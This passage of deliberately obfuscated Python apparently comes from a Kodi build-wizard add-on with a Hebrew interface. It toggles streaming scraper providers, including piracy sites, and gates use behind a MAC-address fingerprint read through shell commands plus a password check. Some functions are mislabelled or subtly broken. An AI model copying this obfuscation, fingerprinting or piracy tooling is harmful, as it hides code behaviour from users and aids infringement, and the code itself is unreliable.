		O00O00OO0O0O0O000 .setSetting ('provider.paczamy','false')#line:1950
		O00O00OO0O0O0O000 .setSetting ('provider.peliculasdk','false')#line:1951
		O00O00OO0O0O0O000 .setSetting ('provider.pelisplustv','false')#line:1952
		O00O00OO0O0O0O000 .setSetting ('provider.pepecine','false')#line:1953
		O00O00OO0O0O0O000 .setSetting ('provider.primewire','false')#line:1954
		O00O00OO0O0O0O000 .setSetting ('provider.projectfreetv','false')#line:1955
		O00O00OO0O0O0O000 .setSetting ('provider.proxer','false')#line:1956
		O00O00OO0O0O0O000 .setSetting ('provider.pureanime','false')#line:1957
		O00O00OO0O0O0O000 .setSetting ('provider.putlocker','false')#line:1958
		O00O00OO0O0O0O000 .setSetting ('provider.putlockerfree','false')#line:1959
		O00O00OO0O0O0O000 .setSetting ('provider.reddit','false')#line:1960
		O00O00OO0O0O0O000 .setSetting ('provider.cartoonwire','false')#line:1961
		O00O00OO0O0O0O000 .setSetting ('provider.seehd','false')#line:1962
		O00O00OO0O0O0O000 .setSetting ('provider.segos','false')#line:1963
		O00O00OO0O0O0O000 .setSetting ('provider.serienstream','false')#line:1964
		O00O00OO0O0O0O000 .setSetting ('provider.series9','false')#line:1965
		O00O00OO0O0O0O000 .setSetting ('provider.seriesever','false')#line:1966
		O00O00OO0O0O0O000 .setSetting ('provider.seriesonline','false')#line:1967
		O00O00OO0O0O0O000 .setSetting ('provider.seriespapaya','false')#line:1968
		O00O00OO0O0O0O000 .setSetting ('provider.sezonlukdizi','false')#line:1969
		O00O00OO0O0O0O000 .setSetting ('provider.solarmovie','false')#line:1970
		O00O00OO0O0O0O000 .setSetting ('provider.solarmoviez','false')#line:1971
		O00O00OO0O0O0O000 .setSetting ('provider.stream-to','false')#line:1972
		O00O00OO0O0O0O000 .setSetting ('provider.streamdream','false')#line:1973
		O00O00OO0O0O0O000 .setSetting ('provider.streamflix','false')#line:1974
		O00O00OO0O0O0O000 .setSetting ('provider.streamit','false')#line:1975
		O00O00OO0O0O0O000 .setSetting ('provider.swatchseries','false')#line:1976
		O00O00OO0O0O0O000 .setSetting ('provider.szukajkatv','false')#line:1977
		O00O00OO0O0O0O000 .setSetting ('provider.tainiesonline','false')#line:1978
		O00O00OO0O0O0O000 .setSetting ('provider.tainiomania','false')#line:1979
		O00O00OO0O0O0O000 .setSetting ('provider.tata','false')#line:1982
		O00O00OO0O0O0O000 .setSetting ('provider.trt','false')#line:1983
		O00O00OO0O0O0O000 .setSetting ('provider.tvbox','false')#line:1984
		O00O00OO0O0O0O000 .setSetting ('provider.ultrahd','false')#line:1985
		O00O00OO0O0O0O000 .setSetting ('provider.video4k','false')#line:1986
		O00O00OO0O0O0O000 .setSetting ('provider.vidics','false')#line:1987
		O00O00OO0O0O0O000 .setSetting ('provider.view4u','false')#line:1988
		O00O00OO0O0O0O000 .setSetting ('provider.watchseries','false')#line:1989
		O00O00OO0O0O0O000 .setSetting ('provider.xrysoi','false')#line:1990
		O00O00OO0O0O0O000 .setSetting ('provider.library','false')#line:1991
def fixfont ():#line:1994
	O0OO00O0O0OOO00OO =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1995
	OOOO0000O000OO0O0 =json .loads (O0OO00O0O0OOO00OO );#line:1997
	OOOOOO0OO0OOOO0OO =OOOO0000O000OO0O0 ["result"]["settings"]#line:1998
	O0OOOOOO00O00OOO0 =[O000O0OO000O0O0O0 for O000O0OO000O0O0O0 in OOOOOO0OO0OOOO0OO if O000O0OO000O0O0O0 ["id"]=="audiooutput.audiodevice"][0 ]#line:2000
	OOO0O0OOO0O0O00OO =O0OOOOOO00O00OOO0 ["options"];#line:2001
	O000000OO0000OOO0 =O0OOOOOO00O00OOO0 ["value"];#line:2002
	OOO0O0OO000O0000O =[OOOO0000000O000OO for (OOOO0000000O000OO ,OOOO0O00OO0000O00 )in enumerate (OOO0O0OOO0O0O00OO )if OOOO0O00OO0000O00 ["value"]==O000000OO0000OOO0 ][0 ];#line:2004
	O0O0OOOOO000O0000 =(OOO0O0OO000O0000O +1 )%len (OOO0O0OOO0O0O00OO )#line:2006
	OOO00OOO0O00O00O0 =OOO0O0OOO0O0O00OO [O0O0OOOOO000O0000 ]["value"]#line:2008
	O000O0O0OO0OO0OOO =OOO0O0OOO0O0O00OO [O0O0OOOOO000O0000 ]["label"]#line:2009
	O0OOOOOOOOO000OO0 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:2011
	try :#line:2013
		O00O0OOO0000OO0OO =json .loads (O0OOOOOOOOO000OO0 );#line:2014
		if O00O0OOO0000OO0OO ["result"]!=True :#line:2016
			raise Exception #line:2017
	except :#line:2018
		sys .stderr .write ("Error switching audio output device")#line:2019
		raise Exception #line:2020
def parseDOM2 (O0O0OOOOO0OO000O0 ,name =u"",attrs ={},ret =False ):#line:2021
	if isinstance (O0O0OOOOO0OO000O0 ,str ):#line:2024
		try :#line:2025
			O0O0OOOOO0OO000O0 =[O0O0OOOOO0OO000O0 .decode ("utf-8")]#line:2026
		except :#line:2027
			O0O0OOOOO0OO000O0 =[O0O0OOOOO0OO000O0 ]#line:2028
	elif isinstance (O0O0OOOOO0OO000O0 ,unicode ):#line:2029
		O0O0OOOOO0OO000O0 =[O0O0OOOOO0OO000O0 ]#line:2030
	elif not isinstance (O0O0OOOOO0OO000O0 ,list ):#line:2031
		return u""#line:2032
	if not name .strip ():#line:2034
		return u""#line:2035
	OOO0O0O00OOOO000O =[]#line:2037
	for OO0OO00O00OO00OOO in O0O0OOOOO0OO000O0 :#line:2038
		O0O0000000OO00OO0 =re .compile ('(<[^>]*?\n[^>]*?>)').findall (OO0OO00O00OO00OOO )#line:2039
		for O0OOOOO0OOOO000O0 in O0O0000000OO00OO0 :#line:2040
			OO0OO00O00OO00OOO =OO0OO00O00OO00OOO .replace (O0OOOOO0OOOO000O0 ,O0OOOOO0OOOO000O0 .replace ("\n"," "))#line:2041
		O00O0OOO00O0O0OO0 =[]#line:2043
		for O0000000O0000OOO0 in attrs :#line:2044
			OO0000O0OOO00O000 =re .compile ('(<'+name +'[^>]*?(?:'+O0000000O0000OOO0 +'=[\'"]'+attrs [O0000000O0000OOO0 ]+'[\'"].*?>))',re .M |re .S ).findall (OO0OO00O00OO00OOO )#line:2045
			if len (OO0000O0OOO00O000 )==0 and attrs [O0000000O0000OOO0 ].find (" ")==-1 :#line:2046
				OO0000O0OOO00O000 =re .compile ('(<'+name +'[^>]*?(?:'+O0000000O0000OOO0 +'='+attrs [O0000000O0000OOO0 ]+'.*?>))',re .M |re .S ).findall (OO0OO00O00OO00OOO )#line:2047
			if len (O00O0OOO00O0O0OO0 )==0 :#line:2049
				O00O0OOO00O0O0OO0 =OO0000O0OOO00O000 #line:2050
				OO0000O0OOO00O000 =[]#line:2051
			else :#line:2052
				O00OOO0OO0O000O00 =range (len (O00O0OOO00O0O0OO0 ))#line:2053
				O00OOO0OO0O000O00 .reverse ()#line:2054
				for OOOO0OO0OOOOO0O0O in O00OOO0OO0O000O00 :#line:2055
					if not O00O0OOO00O0O0OO0 [OOOO0OO0OOOOO0O0O ]in OO0000O0OOO00O000 :#line:2056
						del (O00O0OOO00O0O0OO0 [OOOO0OO0OOOOO0O0O ])#line:2057
		if len (O00O0OOO00O0O0OO0 )==0 and attrs =={}:#line:2059
			O00O0OOO00O0O0OO0 =re .compile ('(<'+name +'>)',re .M |re .S ).findall (OO0OO00O00OO00OOO )#line:2060
			if len (O00O0OOO00O0O0OO0 )==0 :#line:2061
				O00O0OOO00O0O0OO0 =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (OO0OO00O00OO00OOO )#line:2062
		if isinstance (ret ,str ):#line:2064
			OO0000O0OOO00O000 =[]#line:2065
			for O0OOOOO0OOOO000O0 in O00O0OOO00O0O0OO0 :#line:2066
				OOOOOOOOO00O0000O =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (O0OOOOO0OOOO000O0 )#line:2067
				if len (OOOOOOOOO00O0000O )==0 :#line:2068
					OOOOOOOOO00O0000O =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (O0OOOOO0OOOO000O0 )#line:2069
				for O00O0000000OO0000 in OOOOOOOOO00O0000O :#line:2070
					O00OO00000OOOO0O0 =O00O0000000OO0000 [0 ]#line:2071
					if O00OO00000OOOO0O0 in "'\"":#line:2072
						if O00O0000000OO0000 .find ('='+O00OO00000OOOO0O0 ,O00O0000000OO0000 .find (O00OO00000OOOO0O0 ,1 ))>-1 :#line:2073
							O00O0000000OO0000 =O00O0000000OO0000 [:O00O0000000OO0000 .find ('='+O00OO00000OOOO0O0 ,O00O0000000OO0000 .find (O00OO00000OOOO0O0 ,1 ))]#line:2074
						if O00O0000000OO0000 .rfind (O00OO00000OOOO0O0 ,1 )>-1 :#line:2076
							O00O0000000OO0000 =O00O0000000OO0000 [1 :O00O0000000OO0000 .rfind (O00OO00000OOOO0O0 )]#line:2077
					else :#line:2078
						if O00O0000000OO0000 .find (" ")>0 :#line:2079
							O00O0000000OO0000 =O00O0000000OO0000 [:O00O0000000OO0000 .find (" ")]#line:2080
						elif O00O0000000OO0000 .find ("/")>0 :#line:2081
							O00O0000000OO0000 =O00O0000000OO0000 [:O00O0000000OO0000 .find ("/")]#line:2082
						elif O00O0000000OO0000 .find (">")>0 :#line:2083
							O00O0000000OO0000 =O00O0000000OO0000 [:O00O0000000OO0000 .find (">")]#line:2084
					OO0000O0OOO00O000 .append (O00O0000000OO0000 .strip ())#line:2086
			O00O0OOO00O0O0OO0 =OO0000O0OOO00O000 #line:2087
		else :#line:2088
			OO0000O0OOO00O000 =[]#line:2089
			for O0OOOOO0OOOO000O0 in O00O0OOO00O0O0OO0 :#line:2090
				O0OOOO00OOO0O00OO =u"</"+name #line:2091
				OO000O00O000OOOO0 =OO0OO00O00OO00OOO .find (O0OOOOO0OOOO000O0 )#line:2093
				O00OO0OOOOOOO0OO0 =OO0OO00O00OO00OOO .find (O0OOOO00OOO0O00OO ,OO000O00O000OOOO0 )#line:2094
				O0O0O00OO0000OOO0 =OO0OO00O00OO00OOO .find ("<"+name ,OO000O00O000OOOO0 +1 )#line:2095
				while O0O0O00OO0000OOO0 <O00OO0OOOOOOO0OO0 and O0O0O00OO0000OOO0 !=-1 :#line:2097
					O00O000O000OOO0O0 =OO0OO00O00OO00OOO .find (O0OOOO00OOO0O00OO ,O00OO0OOOOOOO0OO0 +len (O0OOOO00OOO0O00OO ))#line:2098
					if O00O000O000OOO0O0 !=-1 :#line:2099
						O00OO0OOOOOOO0OO0 =O00O000O000OOO0O0 #line:2100
					O0O0O00OO0000OOO0 =OO0OO00O00OO00OOO .find ("<"+name ,O0O0O00OO0000OOO0 +1 )#line:2101
				if OO000O00O000OOOO0 ==-1 and O00OO0OOOOOOO0OO0 ==-1 :#line:2103
					O0O0000OO00O0O000 =u""#line:2104
				elif OO000O00O000OOOO0 >-1 and O00OO0OOOOOOO0OO0 >-1 :#line:2105
					O0O0000OO00O0O000 =OO0OO00O00OO00OOO [OO000O00O000OOOO0 +len (O0OOOOO0OOOO000O0 ):O00OO0OOOOOOO0OO0 ]#line:2106
				elif O00OO0OOOOOOO0OO0 >-1 :#line:2107
					O0O0000OO00O0O000 =OO0OO00O00OO00OOO [:O00OO0OOOOOOO0OO0 ]#line:2108
				elif OO000O00O000OOOO0 >-1 :#line:2109
					O0O0000OO00O0O000 =OO0OO00O00OO00OOO [OO000O00O000OOOO0 +len (O0OOOOO0OOOO000O0 ):]#line:2110
				if ret :#line:2112
					O0OOOO00OOO0O00OO =OO0OO00O00OO00OOO [O00OO0OOOOOOO0OO0 :OO0OO00O00OO00OOO .find (">",OO0OO00O00OO00OOO .find (O0OOOO00OOO0O00OO ))+1 ]#line:2113
					O0O0000OO00O0O000 =O0OOOOO0OOOO000O0 +O0O0000OO00O0O000 +O0OOOO00OOO0O00OO #line:2114
				OO0OO00O00OO00OOO =OO0OO00O00OO00OOO [OO0OO00O00OO00OOO .find (O0O0000OO00O0O000 ,OO0OO00O00OO00OOO .find (O0OOOOO0OOOO000O0 ))+len (O0O0000OO00O0O000 ):]#line:2116
				OO0000O0OOO00O000 .append (O0O0000OO00O0O000 )#line:2117
			O00O0OOO00O0O0OO0 =OO0000O0OOO00O000 #line:2118
		OOO0O0O00OOOO000O +=O00O0OOO00O0O0OO0 #line:2119
	return OOO0O0O00OOOO000O #line:2121
def addItem (OOOOOO0OO00OO00OO ,O0OO0O00O0OOOOO00 ,O0000O0O0OO0O0000 ,OOOO0OO0O0O00O0OO ,OO0O00OO0OO0OO0OO ,description =None ):#line:2123
	if description ==None :description =''#line:2124
	description ='[COLOR white]'+description +'[/COLOR]'#line:2125
	O0O00O000OO0O0OO0 =sys .argv [0 ]+"?url="+urllib .quote_plus (O0OO0O00O0OOOOO00 )+"&mode="+str (O0000O0O0OO0O0000 )+"&name="+urllib .quote_plus (OOOOOO0OO00OO00OO )+"&iconimage="+urllib .quote_plus (OOOO0OO0O0O00O0OO )+"&fanart="+urllib .quote_plus (OO0O00OO0OO0OO0OO )#line:2126
	O0O0OOO0000OOOOO0 =True #line:2127
	O0OO0O0OO0O00O0OO =xbmcgui .ListItem (OOOOOO0OO00OO00OO ,iconImage =OOOO0OO0O0O00O0OO ,thumbnailImage =OOOO0OO0O0O00O0OO )#line:2128
	O0OO0O0OO0O00O0OO .setInfo (type ="Video",infoLabels ={"Title":OOOOOO0OO00OO00OO ,"Plot":description })#line:2129
	O0OO0O0OO0O00O0OO .setProperty ("fanart_Image",OO0O00OO0OO0OO0OO )#line:2130
	O0OO0O0OO0O00O0OO .setProperty ("icon_Image",OOOO0OO0O0O00O0OO )#line:2131
	O0O0OOO0000OOOOO0 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0O00O000OO0O0OO0 ,listitem =O0OO0O0OO0O00O0OO ,isFolder =False )#line:2132
	return O0O0OOO0000OOOOO0 #line:2133
def get_params ():#line:2135
		O00000O000OO0OOOO =[]#line:2136
		O00O00OOOOO00000O =sys .argv [2 ]#line:2137
		if len (O00O00OOOOO00000O )>=2 :#line:2138
				O0OOO0O0000O0O000 =sys .argv [2 ]#line:2139
				OO000OO0O000O000O =O0OOO0O0000O0O000 .replace ('?','')#line:2140
				if (O0OOO0O0000O0O000 [len (O0OOO0O0000O0O000 )-1 ]=='/'):#line:2141
						O0OOO0O0000O0O000 =O0OOO0O0000O0O000 [0 :len (O0OOO0O0000O0O000 )-2 ]#line:2142
				O00O0OO00O0OOOO00 =OO000OO0O000O000O .split ('&')#line:2143
				O00000O000OO0OOOO ={}#line:2144
				for OO0O000000OO000O0 in range (len (O00O0OO00O0OOOO00 )):#line:2145
						OOO00O0000O0O0OO0 ={}#line:2146
						OOO00O0000O0O0OO0 =O00O0OO00O0OOOO00 [OO0O000000OO000O0 ].split ('=')#line:2147
						if (len (OOO00O0000O0O0OO0 ))==2 :#line:2148
								O00000O000OO0OOOO [OOO00O0000O0O0OO0 [0 ]]=OOO00O0000O0O0OO0 [1 ]#line:2149
		return O00000O000OO0OOOO #line:2151
def decode (O00OOOOO0OO0O00O0 ,O00O0O00OOOOO0OOO ):#line:2156
    import base64 #line:2157
    O0O00OOOO0OOOOOO0 =[]#line:2158
    if (len (O00OOOOO0OO0O00O0 ))!=4 :#line:2160
     return 10 #line:2161
    O00O0O00OOOOO0OOO =base64 .urlsafe_b64decode (O00O0O00OOOOO0OOO )#line:2162
    for OOO0O0O0O0O0O00OO in range (len (O00O0O00OOOOO0OOO )):#line:2164
        O000OO0O000000000 =O00OOOOO0OO0O00O0 [OOO0O0O0O0O0O00OO %len (O00OOOOO0OO0O00O0 )]#line:2165
        O00OOO00OO0O0O0OO =chr ((256 +ord (O00O0O00OOOOO0OOO [OOO0O0O0O0O0O00OO ])-ord (O000OO0O000000000 ))%256 )#line:2166
        O0O00OOOO0OOOOOO0 .append (O00OOO00OO0O0O0OO )#line:2167
    return "".join (O0O00OOOO0OOOOOO0 )#line:2168
def tmdb_list (O000O00000OOOO000 ):#line:2169
    OO00OOOOOOOO0000O =decode ("7643",O000O00000OOOO000 )#line:2172
    return int (OO00OOOOOOOO0000O )#line:2175
def u_list (OOO0O00O0OO00O00O ):#line:2176
   try :#line:2177
    if xbmc .getCondVisibility ('system.platform.windows')or xbmc .getCondVisibility ('system.platform.android'):#line:2178
        from math import sqrt #line:2179
        OO00000OOO0O00OO0 =tmdb_list (TMDB_NEW_API )#line:2180
        OOOOOO00O000OOOOO =str ((getHwAddr ('eth0'))*OO00000OOO0O00OO0 )#line:2182
        O0OOO00OOOO000OOO =int (OOOOOO00O000OOOOO [1 ]+OOOOOO00O000OOOOO [2 ]+OOOOOO00O000OOOOO [5 ]+OOOOOO00O000OOOOO [7 ])#line:2183
        O0OO0000OO00OO0O0 =(ADDON .getSetting ("pass"))#line:2185
        O0OOO0OOO0OO0OO00 =(str (round (sqrt ((O0OOO00OOOO000OOO *500 )+30 )+30 ,4 ))[-4 :]).replace ('.','')#line:2190
        if '.'in O0OOO0OOO0OO0OO00 :#line:2192
         O0OOO0OOO0OO0OO00 =(str (round (sqrt ((O0OOO00OOOO000OOO *500 )+30 )+30 ,4 ))[-5 :]).replace ('.','')#line:2193
        if O0OO0000OO00OO0O0 ==O0OOO0OOO0OO0OO00 :#line:2195
          OO000O0O0O0O0OO00 =OOO0O00O0OO00O00O #line:2197
        else :#line:2199
           if STARTP2 ()and STARTP ()=='ok':#line:2200
             return OOO0O00O0OO00O00O #line:2203
           OO000O0O0O0O0OO00 ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:2204
           xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:2205
           sys .exit ()#line:2206
        return OO000O0O0O0O0OO00 #line:2207
    else :#line:2208
        STARTP ()#line:2209
   except :#line:2211
           if STARTP2 ()and STARTP ()=='ok':#line:2212
             return OOO0O00O0OO00O00O #line:2215
           OO000O0O0O0O0OO00 ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:2216
           xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:2217
           sys .exit ()#line:2218
def disply_hwr ():#line:2221
   try :#line:2222
    OOO0O00O0OOO0OOOO =tmdb_list (TMDB_NEW_API )#line:2223
    OOO0O0OO00O0O0O0O =str ((getHwAddr ('eth0'))*OOO0O00O0OOO0OOOO )#line:2224
    O00O00O0O0OOO0000 =(OOO0O0OO00O0O0O0O [1 ]+OOO0O0OO00O0O0O0O [2 ]+OOO0O0OO00O0O0O0O [5 ]+OOO0O0OO00O0O0O0O [7 ])#line:2231
    OOO0000O0OO0OOOOO =(ADDON .getSetting ("action"))#line:2232
    wiz .setS ('action',str (O00O00O0O0OOO0000 ))#line:2234
   except :pass #line:2235
def disply_hwr2 ():#line:2236
   try :#line:2237
    OO00OO0OOO00O00O0 =tmdb_list (TMDB_NEW_API )#line:2238
    O00OOOO000000OOOO =str ((getHwAddr ('eth0'))*OO00OO0OOO00O00O0 )#line:2240
    O0O00O0OO00O0O0OO =(O00OOOO000000OOOO [1 ]+O00OOOO000000OOOO [2 ]+O00OOOO000000OOOO [5 ]+O00OOOO000000OOOO [7 ])#line:2249
    O00O0O0OOO0OOOOO0 =(ADDON .getSetting ("action"))#line:2250
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",O0O00O0OO00O0O0OO )#line:2253
   except :pass #line:2254
def getHwAddr (OO00000OOO000OO00 ):#line:2256
   import subprocess ,time #line:2257
   OO00O00O0OOOO0000 ='windows'#line:2258
   if xbmc .getCondVisibility ('system.platform.android'):#line:2259
       OO00O00O0OOOO0000 ='android'#line:2260
   if xbmc .getCondVisibility ('system.platform.android'):#line:2261
     O00O00O0O00O0000O =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:2262
     O0000OOO000O00OO0 =re .compile ('link/ether (.+?) brd').findall (str (O00O00O0O00O0000O ))#line:2264
     OO00OO00OO00OO0O0 =0 #line:2265
     for OOO0OO00O00OO0OO0 in O0000OOO000O00OO0 :#line:2266
      if O0000OOO000O00OO0 !='00:00:00:00:00:00':#line:2267
          O00O00O0OO000O00O =OOO0OO00O00OO0OO0 #line:2268
          OO00OO00OO00OO0O0 =OO00OO00OO00OO0O0 +int (O00O00O0OO000O00O .replace (':',''),16 )#line:2269
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:2271
       OOO000O000O0O0OO0 =0 #line:2272
       OO00OO00OO00OO0O0 =0 #line:2273
       OOO0OOO0OO0O0O0O0 =[]#line:2274
       O0O00O000O0OO00OO =os .popen ("getmac").read ()#line:2275
       O0O00O000O0OO00OO =O0O00O000O0OO00OO .split ("\n")#line:2276
       for OOO00OO0000OOOOOO in O0O00O000O0OO00OO :#line:2278
            OOOOO00000O0O00O0 =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',OOO00OO0000OOOOOO ,re .I )#line:2279
            if OOOOO00000O0O00O0 :#line:2280
                O0000OOO000O00OO0 =OOOOO00000O0O00O0 .group ().replace ('-',':')#line:2281
                OOO0OOO0OO0O0O0O0 .append (O0000OOO000O00OO0 )#line:2282
                OO00OO00OO00OO0O0 =OO00OO00OO00OO0O0 +int (O0000OOO000O00OO0 .replace (':',''),16 )#line:2285
   else :#line:2287
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:2288
   try :#line:2305
    return OO00OO00OO00OO0O0 #line:2306
   except :pass #line:2307
def getpass ():#line:2308
	disply_hwr2 ()#line:2310
def setpass ():#line:2311
    O0OOOO00O0OO000OO =xbmcgui .Dialog ()#line:2312
    O0O0OOOO0O00OOOO0 =''#line:2313
    OO00O0OO000OO000O =xbmc .Keyboard (O0O0OOOO0O00OOOO0 ,'הכנס סיסמה')#line:2315
    OO00O0OO000OO000O .doModal ()#line:2316
    if OO00O0OO000OO000O .isConfirmed ():#line:2317
           OO00O0OO000OO000O =OO00O0OO000OO000O .getText ()#line:2318
    wiz .setS ('pass',str (OO00O0OO000OO000O ))#line:2319
def setuname ():#line:2320
    OO00OO0OO00OO0OO0 =''#line:2321
    O0OOOOO0000O0O0O0 =xbmc .Keyboard (OO00OO0OO00OO0OO0 ,'הכנס שם משתמש')#line:2322
    O0OOOOO0000O0O0O0 .doModal ()#line:2323
    if O0OOOOO0000O0O0O0 .isConfirmed ():#line:2324
           OO00OO0OO00OO0OO0 =O0OOOOO0000O0O0O0 .getText ()#line:2325
           wiz .setS ('user',str (OO00OO0OO00OO0OO0 ))#line:2326
def powerkodi ():#line:2327
    os ._exit (1 )#line:2328
def buffer1 ():#line:2330
	OOOOO0OO0OOOO00OO =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:2331
	O0OOOO0OO0O000O00 =xbmc .getInfoLabel ("System.Memory(total)")#line:2332
	O0OO00O0000O00000 =xbmc .getInfoLabel ("System.FreeMemory")#line:2333
	OOOOO00O00OO0OOOO =re .sub ('[^0-9]','',O0OO00O0000O00000 )#line:2334
	OOOOO00O00OO0OOOO =int (OOOOO00O00OO0OOOO )/3 #line:2335
	O00000O0000O00OO0 =OOOOO00O00OO0OOOO *1024 *1024 #line:2336
	try :OO000OOOO00O0OOO0 =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:2337
	except :OO000OOOO00O0OOO0 =16 #line:2338
	OO0O000O00O00OO0O =DIALOG .yesno ('FREE MEMORY: '+str (O0OO00O0000O00000 ),'Based on your free Memory your optimal buffersize is: '+str (OOOOO00O00OO0OOOO )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:2341
	if OO0O000O00O00OO0O ==1 :#line:2342
		with open (OOOOO0OO0OOOO00OO ,"w")as O0OOOOO0O0O000O00 :#line:2343
			if OO000OOOO00O0OOO0 >=17 :OO0O0O0OOOOO0OO00 =xml_data_advSettings_New (str (O00000O0000O00OO0 ))#line:2344
			else :OO0O0O0OOOOO0OO00 =xml_data_advSettings_old (str (O00000O0000O00OO0 ))#line:2345
			O0OOOOO0O0O000O00 .write (OO0O0O0OOOOO0OO00 )#line:2347
			DIALOG .ok ('Buffer Size Set to: '+str (O00000O0000O00OO0 ),'Please restart Kodi for settings to apply.','')#line:2348
	elif OO0O000O00O00OO0O ==0 :#line:2350
		O00000O0000O00OO0 =_O000OOOO0OO0OOO00 (default =str (O00000O0000O00OO0 ),heading ="INPUT BUFFER SIZE")#line:2351
		with open (OOOOO0OO0OOOO00OO ,"w")as O0OOOOO0O0O000O00 :#line:2352
			if OO000OOOO00O0OOO0 >=17 :OO0O0O0OOOOO0OO00 =xml_data_advSettings_New (str (O00000O0000O00OO0 ))#line:2353
			else :OO0O0O0OOOOO0OO00 =xml_data_advSettings_old (str (O00000O0000O00OO0 ))#line:2354
			O0OOOOO0O0O000O00 .write (OO0O0O0OOOOO0OO00 )#line:2355
			DIALOG .ok ('Buffer Size Set to: '+str (O00000O0000O00OO0 ),'Please restart Kodi for settings to apply.','')#line:2356
def xml_data_advSettings_old (O0O0OOOO0O0O00O00 ):#line:2357
	O0O000O0O00OO00OO ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%O0O0OOOO0O0O00O00 #line:2367
	return O0O000O0O00OO00OO #line:2368
def xml_data_advSettings_New (O0OOOOOO0OO000O0O ):#line:2370
	OOO00OO00OO00OO0O ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%O0OOOOOO0OO000O0O #line:2382
	return OOO00OO00OO00OO0O #line:2383
def write_ADV_SETTINGS_XML (O000OO0OO000OO0OO ):#line:2384
    if not os .path .exists (xml_file ):#line:2385
        with open (xml_file ,"w")as OOOO0O0OO0O00OOOO :#line:2386
            OOOO0O0OO0O00OOOO .write (xml_data )#line:2387
def _O000OOOO0OO0OOO00 (default ="",heading ="",hidden =False ):#line:2388
    ""#line:2389
    OO0O0OOO000O0OO0O =xbmc .Keyboard (default ,heading ,hidden )#line:2390
    OO0O0OOO000O0OO0O .doModal ()#line:2391
    if (OO0O0OOO000O0OO0O .isConfirmed ()):#line:2392
        return unicode (OO0O0OOO000O0OO0O .getText (),"utf-8")#line:2393
    return default #line:2394
def index ():#line:2396
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:2397
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2398
	if AUTOUPDATE =='Yes':#line:2399
		if wiz .workingURL (WIZARDFILE )==True :#line:2400
			O0OO0O0OOO000OO0O =wiz .checkWizard ('version')#line:2401
			if O0OO0O0OOO000OO0O >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,O0OO0O0OOO000OO0O ),'wizardupdate',themeit =THEME2 )#line:2402
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2403
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2404
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2405
	if len (BUILDNAME )>0 :#line:2406
		OO00O0000OO00O000 =wiz .checkBuild (BUILDNAME ,'version')#line:2407
		OOO0O00O00OOOOOO0 ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:2408
		if OO00O0000OO00O000 >BUILDVERSION :OOO0O00O00OOOOOO0 ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(OOO0O00O00OOOOOO0 ,OO00O0000OO00O000 )#line:2409
		addDir (OOO0O00O00OOOOOO0 ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:2411
		try :#line:2413
		     O00OOO0O0OOOO0OOO =wiz .themeCount (BUILDNAME )#line:2414
		except :#line:2415
		   O00OOO0O0OOOO0OOO =False #line:2416
		if not O00OOO0O0OOOO0OOO ==False :#line:2417
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:2418
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:2419
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2422
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2423
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2424
	addFile ('אימות חשבונות','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:2428
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:2430
